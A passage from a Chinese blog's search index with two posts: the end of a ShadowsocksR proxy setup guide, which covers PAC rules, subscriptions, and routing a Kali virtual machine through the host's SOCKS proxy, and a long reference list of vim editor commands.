src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584020818207.png" alt="pac代理规则"></p><ul><li>绕过局域网，局域网内IP 不走代理直连，局域网外IP 都走代理。</li><li>绕过局域网和大陆，访问网站的是 大陆IP 都不走代理直连，访问 非大陆IP 的网站都走代理。</li><li>绕过局域网和非大陆，访问网站的是 大陆IP 都走代理，访问 非大陆IP 的网站都不走代理，这个一般是海外访问国内网站用的。</li><li>全局，直接走代理</li></ul><h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><blockquote><p>负载均衡功能，适用于网页浏览，不适用于看视频或下载等需要大流量的环境。如需下载请在连接统计窗口通过下载测速测试速度最快的服务器然后单独连接之。<br>简单的说就是，用用这个节点用用那个节点，不照着一个节点用，并不是所有Shadowsocks账号都一起使用，达成所有节点负载均衡的目的。所以大流量的时候不要开这个。</p></blockquote><h1 id="SSR-服务器订阅设置"><a href="#SSR-服务器订阅设置" class="headerlink" title="SSR 服务器订阅设置"></a>SSR 服务器订阅设置</h1><blockquote><p>点击“ADD”，然后在右侧填入你的SSR服务器订阅地址，即可添加一条服务器订阅，然后直接点击确定即可。如果你勾选了左下角的“自动更新”，在每次SSR启动的时候都会自动更新订阅，一般情况下无需选择。</p></blockquote><h1 id="更新服务器订阅"><a href="#更新服务器订阅" class="headerlink" title="更新服务器订阅"></a>更新服务器订阅</h1><blockquote><p>将会从已经设置的订阅地址中获取配置信息自动添加/更新至服务器配置中，并且此操作会通过你当前的SSR代理进行！如果你目前的SSR代理不是可用的代理，那么将会更新失败！因此建议选择“更新服务器订阅（不通过代理）”。一般只有SSR服务器订阅地址不能在墙内访问而你有可以使用的SSR代理配置的时候才需要使用SSR代理更新订阅。</p></blockquote><h1 id="浏览器使用代理"><a href="#浏览器使用代理" class="headerlink" title="浏览器使用代理"></a>浏览器使用代理</h1><p>要注意，在浏览器中使用要代理到127.0.0.1:1080<br><strong>Google浏览器插件：SwitchyOmega</strong></p><h1 id="kali中使用ssr"><a href="#kali中使用ssr" class="headerlink" title="kali中使用ssr"></a>kali中使用ssr</h1><ul><li><p>ssr 右键点击选项设置</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584021718807.png" alt="选项设置 ">、</p></li><li><p>查看虚拟机与主机ip，确保互通，测试虚拟机能否telnet主机的1080端口<br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584021877250.png" alt="主机ip"></p></li></ul><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584022075612.png" alt="要使用代理的内网"></p><pre class=" language-vim"><code class="language-vim">#新建代理脚本<span class="token keyword">vim</span> <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">profile</span><span class="token operator">.</span><span class="token keyword">d</span><span class="token operator">/</span>proxy<span class="token operator">.</span><span class="token keyword">sh</span>#在proxy<span class="token operator">.</span><span class="token keyword">sh</span>中写入、添加主机代理端口信息，之后保存退出export ALL_PROXY<span class="token operator">=</span>socks5<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token operator">.</span><span class="token number">128.1</span><span class="token punctuation">:</span><span class="token number">1080</span>#使生效<span class="token keyword">source</span> <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">profile</span><span class="token operator">.</span><span class="token keyword">d</span><span class="token operator">/</span>proxy<span class="token operator">.</span><span class="token keyword">sh</span></code></pre><h2 id="虚拟机里的浏览器代理插件代理即可"><a href="#虚拟机里的浏览器代理插件代理即可" class="headerlink" title="虚拟机里的浏览器代理插件代理即可"></a>虚拟机里的浏览器代理插件代理即可</h2>]]></content>
      
      
      <categories>
          
          <category> 使用说明 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim命令大全</title>
      <link href="/posts/b8e.html"/>
      <url>/posts/b8e.html</url>
      
        <content type="html"><![CDATA[<p><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582729605358.png" alt="enter description here"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="vim-的基本概念"><a href="#vim-的基本概念" class="headerlink" title="vim 的基本概念"></a>vim 的基本概念</h2><p>基本上vi可分为三种操作状态，分别是命令模式（Command mode）、插入模式（Insert mode）和底线命令模式（Last line mode），各模式的功能区分如下：</p><p>1． Comand mode：控制屏幕光标的移动，字符或光标的删除，移动复制某区段及进入Insert mode下，或者到Last line mode。</p><p>2． Insert mode：唯有在Insert mode下，才可做文字数据输入，按Esc等可回到Comand mode。</p><p>3． Last line mode：将储存文件或离开编辑器，也可设置编辑环境，如寻找字符串、列出行号等。  </p><p>  vi的基本操作</p><p>?进入vi</p><p>在系统提示符号输入vi及文件名称后，即可进入vi全屏幕编辑画面：</p><p>$ vi testfile</p><p>有一点要特别注意，就是您进入vi之后是处于“Command mode”下，您要切换到Insert mode才能输入文字。初次用vi的用户都会想先用上下左右键移动光标，结果电脑一直叫，把自己气个半死，所以进入vi后，先不要乱动，转换入 Insert后再说。</p><p>?切换至Insert mode编辑文件</p><p>在Command mode下按‘i’、‘a’或‘o’三键就可进入Insert mode。这时候您就可以开始输入文字了。</p><p>i: 插入，从目前光标所在之处插入所输入的文字。</p><p>a: 增加，目前光标所在的下一个字开始输入文字。</p><p>o: 插入新的一行，从行首开始输入文字。</p><p>?Insert的切换→Command mode，按Esc键</p><p>您目前处于Insert mode，您就只能一直打字。假如您发现打错字了，想用光标键往回移动，将该字删除，就要按ESC键转换回Command mode，再删除文字。</p><p>? 离开vi及存文件</p><p>在Command mode下，可按冒号“：”键入入Last line mode，例如：</p><p>:w filename (输入“w filename”，将文章存入指定的文件名filename)</p><p>:wq (输入“wq”，因为进入之时已经指定文件名testfile，所以会写入testfile并离开vi)</p><p>:q! (输入“q!”，强制离开并放弃编辑的文件)</p><p>Command mode功能键列表</p><p>在介绍command mode指令的时后，指令后面加上“常用”字眼的功能键，表示比较常用的vi指令，请读者您一定要学会、记住。</p><p>（1）I、a、o切换进入 Insert mode。[超级常用]</p><p>（2）移动光标</p><p>vi可以直接用键盘上的光标键来上下左右移动，但正规的vi是用小写英文字母</p><p>h、 j、k、l，分别控制光标左、下、上、右移一格。</p><p>按Ctrl+B：屏幕往后移动一页。[常用]</p><p>按Ctrl+F：屏幕往前移动一页。[常用]</p><p>按Ctrl+U：屏幕往后移动半页。</p><p>按Ctrl+D：屏幕往前移动半页。</p><p>按 0 （数字零）：移动文章的开头。[常用]</p><p>按 G：移动到文章的最后。[常用]</p><p>按 w：光标跳到下个word的开头。[常用]</p><p>按 e：光标跳到下个word的字尾。</p><p>按 b：光标回到上个word的开头。</p><p>按 $：移到光标所在行的行尾。[常用]</p><p>按 ^：移到该行第一个非空白的字符。</p><p>按 0：移到该行的开头位置。[常用]<br>（3）删除文字</p><p>x：每按一次删除光标所在位置的后面一个字符。[超常用]</p><p>#x：例如，6x 表删除光标所在位置的后面6个字符。[常用]</p><p>X：大字的X，每按一次删除光标所在位置的前面一个字符。</p><p>#X：例如，20X 表删除光标所在位置的前面20个字符。</p><p>dd：删除光标所在行。[超常用]</p><p>#dd：例如，6dd表删除从光标所在的该行往下数6行之文字。[常用]</p><p>（4）复制</p><p>yw：将光标所在处到字尾的字符复制到缓冲区中。</p><p>（想在和#x、#X的功能相反）</p><p>p：将缓冲区内的字符粘贴到光标所在位置（指令‘yw’与‘p必须搭配使用）。</p><p>yy：复制光标所在行。[超常用]</p><p>p：复制单行到您想粘贴之处。（指令‘yy’与‘p’必须搭配使用）</p><p>#yy：如：6yy表示拷贝从光标所在的该行往下数6行之文字。[常用]</p><p>p:复制多行到您想粘贴之处。（指令‘#yy’与‘p’必须搭配使用）</p><p>“ayy：将复制行放入buffer a, vi提供buffer功能，可将常用的数据存在buffer</p><p>“ap：将放在buffer a的数据粘贴。</p><p>“b3yy：将三行数据存入 buffer b。</p><p>“b3p：将存在buffer b的资料粘贴</p><p>（5）取代</p><p>r: 取代光标所在处的字符：[常用]</p><p>R：取代字符直到按Esc为止。</p><p>（6）复原（undo）上一个指令</p><p>u：假如您误操作一个指令，可以马上按u，回复到上一个操作。[超常用]</p><p>.: .可以重复执行上一次的指令。</p><p>（7）更改</p><p>cw：更改光标所在处的字到字尾$处。</p><p>c#w：例如，c3w代表更改3个字。</p><p>（8）跳至指定行</p><p>Ctrl+G：列出光标所在行的行号。</p><p>#G：例如，15G，表示移动光标至文章的第15行行首。[常用]</p><p>Last line mode下指令简介</p><p>读者您要使用Last line mode之前，请记得先按Esc键确定您已经处于Command mode下后，再按冒号“：”或“/”或“？”三键的其中一键进入Last line mode。</p><p>1．列出行号</p><p>set nu: 输入“set nu”后，会在文章的每一行前面列出行号。</p><p>2．跳到文章的某一行</p><p>#：井号代表一个数字，在Last line mode提示符号“：”前输入数字，再按Enter就会跳到该行了，如：15[Enter]就会跳到文章的第15行。[常用]</p><p>3．寻找字符串</p><p>/ 关键字：先按/，再输入您想寻找的字，如果第一次找的关键字不是您相尽可能的，可以一直按n会往下寻找到您要的关键字为止。</p><p>？关键字：先按？，再输入您想寻找的字，如果第一次找的关键字不是您想要的，可以按n会往前寻找到您要的关键字为止。</p><p>4．取代字符串</p><p>1，$s/string /replae/g：在last line mode输入“1，$s/string/replace/g”会将全文的string字符串取代为replace字符串，其中1,$s就是指搜寻区间为文章从头至尾的意思，g则是表示全部取代不必确认。</p><p>%s/string/replace/c：同样会将全文的string字符串取代为 replace字符串，和上面指令不同的地方是，%s和1,$s是相同的功能，c则是表示要替代之前必须再次确认是否取代。</p><p>1,20s/string /replace/g：将1至20行间的string替代为relpace字符串。</p><p>5．存文件</p><p>w：在last line mode提示符号“：”前按w即可将文件存起来。[超常用]</p><p>#，# w filename：如果您想摘取文章的某一段，存成另一个文件，可用这个指令#代表行号，例如30,50 w nice，将您正在编辑文章的第30~50行存成nice这个文件。</p><p>6．离开</p><p>q：按q就离开，有时如果无法离开vi，可搭配“！：强置离开vi，如“q！”</p><p>qw：一般建议离开时，搭配w一起使用，如此离开时还可存文件。[常用]</p><h2 id="插入文本类命令"><a href="#插入文本类命令" class="headerlink" title="插入文本类命令"></a>插入文本类命令</h2><p>i ：在光标前<br>I ：在当前行首<br>a：光标后<br>A：在当前行尾<br>o：在当前行之下新开一行<br>O：在当前行之上新开一行<br>r：替换当前字符<br>R：替换当前字符及其后的字符，直至按ESC键<br>s：从当前光标位置处开始，以输入的文本替代指定数目的字符<br>S：删除指定数目的行，并以所输入文本代替之<br>ncw或nCW：修改指定数目的字<br>nCC：修改指定数目的行 </p><h2 id="移动光标命令"><a href="#移动光标命令" class="headerlink" title="移动光标命令"></a>移动光标命令</h2><p>h ：光标左移一个字符<br>l ：光标右移一个字符<br>space：光标右移一个字符<br>Backspace：光标左移一个字符<br>k或Ctrl+p：光标上移一行<br>j或Ctrl+n ：光标下移一行<br>Enter ：光标下移一行<br>w或W ：光标右移一个字至字首<br>b或B ：光标左移一个字至字首<br>e或E ：光标右移一个字至字尾<br>) ：光标移至句尾<br>( ：光标移至句首<br>}：光标移至段落开头<br>{：光标移至段落结尾<br>nG：光标移至第n行首<br>n+：光标下移n行<br>n-：光标上移n行<br>n$：光标移至第n行尾<br>H ：光标移至屏幕顶行<br>M ：光标移至屏幕中间行<br>L ：光标移至屏幕最后行<br>0：（注意是数字零）光标移至当前行首<br>$：光标移至当前行尾 </p><h2 id="屏幕翻滚命令"><a href="#屏幕翻滚命令" class="headerlink" title="屏幕翻滚命令"></a>屏幕翻滚命令</h2><p>Ctrl+u：向文件首翻半屏<br>Ctrl+d：向文件尾翻半屏<br>Ctrl+f：向文件尾翻一屏<br>Ctrl＋b；向文件首翻一屏<br>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。 </p><h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字<br>do：删至行首<br>d$：删至行尾<br>ndd：删除当前行及其后n-1行<br>x或X：删除一个字符，x删除光标后的，而X删除光标前的<br>Ctrl+u：删除输入方式下所输入的文本 </p><h2 id="搜索及替换命令"><a href="#搜索及替换命令" class="headerlink" title="搜索及替换命令"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern<br>?pattern：从光标开始处向文件首搜索pattern<br>n：在同一方向重复上一次搜索命令<br>N：在反方向上重复上一次搜索命令<br>：s/p1/p2/g：将当前行中所有p1均用p2替代<br>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代<br>：g/p1/s//p2/g：将文件中所有p1均用p2替换 </p><h2 id="选项设置"><a href="#选项设置" class="headerlink" title="选项设置"></a>选项设置</h2><p>all：列出所有选项设置情况<br>term：设置终端类型<br>ignorance：在搜索中忽略大小写<br>list：显示制表位(Ctrl+I)和行尾标志（$)<br>number：显示行号<br>report：显示由面向行的命令修改过的数目<br>terse：显示简短的警告信息<br>warn：在转到别的文件时若没保存当前文件则显示NO write信息<br>nomagic：允许在搜索模式中，使用前面不带“\”的特殊字符<br>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始<br>mesg：允许vi显示其他用户用write写到自己终端上的信息 </p><h2 id="保存退出"><a href="#保存退出" class="headerlink" title="保存退出"></a>保存退出</h2><p>┌───────────┬───────────────┐<br>│命令　　　　　　　　　│描述　　　　　　　　　　　　　│<br>├───────────┼───────────────┤<br>│zz　　　　　　　　　　│保存并退出　　　　　　　　　　│<br>├───────────┼───────────────┤<br>│:w filename　　　　 　│写入文件　　　　　　　　　 　 │<br>├───────────┼───────────────┤<br>│:W　　　　　　　　　　│写入文件　　　　　　　　　　　│<br>├───────────┼───────────────┤<br>│:x　　　　　　　　　　│保存(如果当前文件修改过)并退出│<br>├───────────┼───────────────┤<br>│:q!　　　　　　　　　 │不保存文件，直接退出　　 　　 │<br>├───────────┼───────────────┤<br>│:q　　　　　　　　　　│退出vi　　　　　　　　　　　　│ </p>]]></content>
      
      
      <categories>
          
          <category> 编辑器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 编辑器 </tag>
            
            <tag> 大全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
